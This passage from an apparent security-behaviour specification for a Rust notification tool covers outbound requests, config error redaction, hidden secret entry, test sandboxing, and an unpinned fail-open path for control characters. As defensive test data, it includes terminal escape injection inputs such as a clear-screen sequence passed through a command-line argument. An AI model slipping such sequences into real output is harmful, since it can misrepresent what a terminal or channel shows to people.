  1. The router on the local network, `X-API-KEY` header, a GET of the clients listing. Nothing but the
     key is sent.
  1. GitHub, through `gh pr list --repo <repo> --search merged:<from>..<to>`, which sends the repository
     name and the window and reads back `number,title,body`.
- Failure sources: an unreachable endpoint, a refused status, a self-signed certificate.
- Fail direction: for moshi and hue, silent. For hermes in sync mode and for the recap, loud. For the
  router and the home probe, "no answer reads as unknown, which never suppresses".
- Thresholds: as in the ceiling table.
- Required side effects: none beyond the request.
- Forbidden side effects: `max_redirects(0)` on all four HTTP clients (moshi, hermes, hue, router).
- Timeout and cancellation: 10 s for moshi and hue (`BRIDGE_DEADLINE`), 1 s for the lights mute's
  inventory read (`TYPED_COMMAND_DEADLINE`, "with a HUMAN waiting on it"), the hermes deadlines above, 30
  s for `gh`.
- Idempotency and duplicates: nothing retries except the recap's single fallback.
- Privacy: TLS certificate verification is DISABLED for the hue bridge and the router, and both doc
  comments say why: each "serves a self-signed certificate for its own LAN address, and no CA vouches for
  it". Both are local-network addresses the operator configured, and neither carries event text. It is
  not disabled for moshi or hermes.
- Process ownership and cleanup: `gh` runs as a bounded child; the four HTTP clients are in process.
- Compatibility contract: the summarizer and the condenser are CHILD processes handed prompt text on
  stdin. Whether either reaches a network is the child's own business; the condenser is `codex exec`,
  which is a model call, and the recap's summarizer is whatever argv the operator configured.

### 20. A config refusal names the fault without echoing the value

Given `~/.config/pns/config.toml` contains `[plugins.mobile]\ntoken = "SUPERSECRET" trailing`

When `config::parse_config` refuses it

Then the refusal names the cause and the LINE NUMBER and does not contain `SUPERSECRET`

- Success: the TOML parser's own `Display` echoes the offending source line, so `parse_config` rebuilds
  the message from `error.message()` and the line derived from `error.span()`. Pinned by
  `src/config.rs:a_malformed_line_is_reported_without_echoing_its_value`.
- Failure sources: a file that is not TOML (`Malformed`), one that violates the schema (`Invalid`), one
  that cannot be read (`Unreadable`). `Missing` is deliberately NOT an error.
- Fail direction: fail-loud and fail-closed together. "A config that fails to parse and quietly becomes
  nothing enabled would turn every notification off with no trace"
  (`src/config.rs:malformed_toml_is_a_loud_error_never_a_silent_empty_config`).
- Thresholds: Not applicable.
- Required side effects: an unknown top-level key is refused BY NAME and the six the file serves are
  listed, because a table that MOVED "refuses the file whole and takes every plugin's secret with it"
  (`src/config.rs:a_table_the_file_does_not_serve_is_refused_listing_the_tables_it_does`).
- Forbidden side effects: `ConfigError::detail` is documented as "already sanitized for printing", and
  the detail is what every mode wraps in its own sentence.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: pure function of the text.
- Privacy: this is the one place a whole config, secrets and all, is in hand as a string. The refusal is
  the only thing that escapes, and it carries a cause and a location.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `home::spell` and `home::client_label` both echo a value through `{:?}`, which
  quotes and escapes it, and both are used only for values the OPERATOR wrote or the router named, never
  for a secret. `tests/dispatch.rs:the_alert_carries_no_secret_and_no_raw_router_text` asserts the exact
  escaped rendering `matched a different client "mo\"use\u{1b}[2J"` reaches the terminal while the alert
  BODY carries no router text at all, because the sentence is built from config KEY NAMES.

### 21. Two paths carry text to a channel with NO control-character scrub, and this is unpinned

Given `pns --detail $'a\033b'` on the command line, or an assistant turn whose final text carries an
escape sequence

When the event is rendered and delivered

Then the escape byte survives into the banner argument, the hermes body, the activity ring and any recap
built from it

- Success: not a success. `main::rendered_event` clones `agent`, `state`, `project`, `branch` and
  `detail` from `args::EventArgs` verbatim, and `main::turn_reply` passes the reply through
  `render::flatten_reply` only, which splits on exactly space, tab, carriage return and newline. Neither
  path calls `hooks::flattened`, `rendered_plainly` or `safe_line`. `recap::described`, which composes a
  mechanical timeline line from an activity ring `Entry`, also applies no filter.
- Failure sources: any producer that puts a C0, DEL or C1 byte other than tab, carriage return or newline
  into `--detail`, `--project`, `--branch`, `--agent` or `--state`; any assistant turn whose text quotes
  such a byte.
- Fail direction: fail-OPEN. The byte passes through.
- Thresholds: the value is still capped: `REPLY_MAX_CHARS` = 8,000 on a reply, `PREVIEW_MAX_CHARS` = 260
  on the preview, `ACTIVITY_MAX_CHARS` = 120 per activity field, 260 per journal field.
- Required side effects: none.
- Forbidden side effects: `NOT ESTABLISHED:` no test forbids this. Searched `tests/` and `src/` for an
  assertion that an argv-supplied or transcript-supplied field is control-scrubbed;
  `src/hooks.rs:every_class_of_control_byte_is_scrubbed_before_a_line_reaches_a_channel` covers only the
  values `hooks::flattened` sees, and
  `src/render.rs:whitespace_outside_the_four_is_content_the_turn_wrote_rather_than_a_separator` pins the
  OPPOSITE for two of them (form feed and no-break space are kept deliberately). The decision ring is
  safe by behavior 11; the banner is not made safe by `banner::verbatim_argument`, which only prefixes a
  backslash.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: Not applicable.
- Privacy: the exposure is integrity rather than confidentiality. A reordering or terminal-control
  sequence in a reply can misrepresent what a turn said on a banner, in a herdr pane and in Discord.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the split is deliberate at the payload boundary (`hooks::flattened` exists
  exactly because "the provider's own error string ... is the one value on this path that nothing on this
  machine wrote") and simply does not extend to argv or to the transcript. Whether a turn's own reply
  counts as hostile input is a design question this crate has not answered in code.

### 22. A secret typed into setup never reaches the terminal

Given the operator runs `pns setup` on a real terminal and types a moshi token, a hermes key, a hue key
and a router key

When the wizard finishes

Then none of the four appears anywhere in the pseudoterminal transcript, all four appear in the published
config, and the config is mode `0600`

- Success: `main::ask_hidden` clears `ECHO` and sets `ECHONL` with `tcsetattr(TCSAFLUSH)` BEFORE the
  prompt prints, and a guard restores the original terminal settings when it drops. `publish_config`
  creates the pending file `create_new` at `CONFIG_FILE_MODE` = `0600` and re-narrows it on the handle
  before publishing by rename. Pinned by
  `tests/setup.rs:a_secret_typed_into_setup_never_reaches_the_pty_output`, which arms all four branches
  with distinct sentinels ("a test that only walked the token ... cannot tell `armed_secret` from `armed`
  on the hermes, hue or router branch"), asserts `ECHO` is already 0 while the first prompt is visible,
  asserts an ordinary `[y/N]` answer STILL echoes, asserts the four secrets reach the file, asserts the
  mode is `0600`, and asserts echo is restored after the child exits.
- Failure sources: no terminal at all, in which case the walk is refused rather than guessed: "guessing
  every answer would write a config the operator never agreed to, over one they may already have". A
  `tcsetattr` that fails prints `the terminal's echo could not be turned off (tcsetattr: {error})` and
  the read does not proceed.
- Fail direction: fail-closed. No terminal means no walk; no echo suppression means no hidden read.
- Thresholds: Not applicable.
- Required side effects: the pending file carries the mode, "because it is what gets published: writing
  at the umask would publish a config whose plugin secrets any process on the machine can read". The old
  config is MOVED aside rather than copied, "so the backup holds what was actually replaced".
- Forbidden side effects: `publish_config` is create-if-absent and never a blanket rename; a config that
  appeared between the check and the publish is another writer's and the `AlreadyExists` failure IS the
  refusal. The pending file is removed whichever way the publish went, and only ever the one this run
  made.
- Timeout and cancellation: signals raised during the hidden read are held until the guard drops
  (`tests/setup.rs:a_signal_sent_during_the_hidden_read_is_held_until_the_guard_drops`), which is
  `readpassphrase(3)`'s own set.
- Idempotency and duplicates: `pending_name` carries the process id AND a nanosecond, so a leftover from
  an abandoned run of the same id cannot refuse a wizard nobody can unblock.
- Privacy: this is the only interactive path on which a secret is typed.
- Process ownership and cleanup: the guard restores the terminal even when the child has already exited.
- Compatibility contract: `unresolvable_ancestor` exists so that a dangling symlink anywhere above the
  config path is told apart from a genuinely missing config BEFORE the walk starts, because otherwise the
  reading "walks the whole questionnaire and only fails at publication, with every answer already typed
  and every secret already handed over".

### 23. A test failure message can only contain sandbox-planted values

Given any test in `tests/` fails and prints its assertion message

When that message interpolates a captured request, a process output, a transcript or a file

Then every value in it came from the test's own sandbox, never from the operator's config or state

- Success: `tests/support/mod.rs:Sandbox::bare` calls `env_clear()` and restores only `HOME` (pointed at
  the sandbox root), `PATH`, and `MOSHI_HOOK_BIN` (pointed at a path inside the sandbox that nothing ever
  creates). `Sandbox::pns` adds `CODEX_BIN=/nonexistent/codex`. Every secret that appears in a failure
  message is a literal written in a test file: `tok-integration` (`tests/native.rs`), `k-123` and
  `hermes-signing-secret` (`tests/dispatch.rs`), `do-not-echo-this-token` and its three siblings
  (`tests/setup.rs`), `SUPERSECRET` (`src/config.rs`).
- Failure sources: a test that forgets to stub. This happened: "a test that forgot to stub raised a real
  card on a real phone during slice 11, and a second one was found by review in the daemon suite", which
  is why `MOSHI_HOOK_BIN` is fenced off BY DEFAULT rather than per test.
- Fail direction: fail-closed by default. The old harness named the variables to REMOVE, "which meant
  every new override had to be added here too or it would leak in silently"; it now states what a test
  keeps, "and a new override is excluded by default".
- Thresholds: Not applicable.
- Required side effects: `tests/support/mod.rs:DaemonGuard::start` asserts the state directory starts with the
  sandbox root AND is not `$HOME/.local/state/pns`, because "a tick against the operator's real
  `~/.local/state/pns` would run their jobs, write their heartbeat and leave their spool drained".
- Forbidden side effects: environment is NEVER set through `std::env::set_var`, "the test binary is
  threaded, so a process-wide mutation would leak into whatever else is running". Every variable rides on
  the `Command`. The macOS Focus store is written into the sandbox's own `HOME`, with no variable naming
  the path, and "NOTHING HERE READS THE OPERATOR'S OWN STORE, which would answer differently on every run
  and on every machine".
- Timeout and cancellation: `TEST_BUDGET_MS` = 1,000 warns; `TEST_CEILING_MS` = 5,000 fails the build,
  unless the sandbox is excused or already unwinding.
- Idempotency and duplicates: each sandbox is its own directory.
- Privacy: `NOT ESTABLISHED:` nothing GATES a future test from reading the operator's real `$HOME`. The
  guarantee is the harness convention (`bare` with `env_clear`) plus the one explicit assertion in
  `Daemon::start`. No general check refuses a test that reaches outside its sandbox, and none was found
  in `test/validate-tests.sh`'s remit either, which polices file placement rather than file access.
- Process ownership and cleanup: a `Sandbox` prints a "test budget" line to stderr on drop when it lived
  past the review line.
- Compatibility contract: `PNS_STATE_DIR`, `PNS_CHANNELS_DIR`, `PNS_MOSHI_URL`, `PNS_HERMES_URL`,
  `MOSHI_HOOK_BIN`, `CODEX_BIN` and `PNS_IDLE_SECS` are the seams that make the sandbox possible. A new
  world-reading seam without an override is a test that cannot be sandboxed.
